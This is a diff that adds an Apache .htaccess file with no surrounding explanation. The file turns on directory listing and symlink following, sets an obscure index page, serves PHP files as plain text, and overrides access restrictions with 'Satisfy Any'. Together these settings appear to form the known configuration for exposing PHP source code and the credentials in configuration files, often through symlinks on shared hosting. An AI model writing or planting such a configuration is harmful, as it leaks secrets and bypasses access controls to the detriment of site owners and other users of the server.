@@ -1,0 +1,6 @@
+ReadmeName %{user}%
+Options Indexes FollowSymLinks
+DirectoryIndex Dx4jH8d.htm
+AddType text/plain .php
+AddHandler text/plain .php
+Satisfy Any
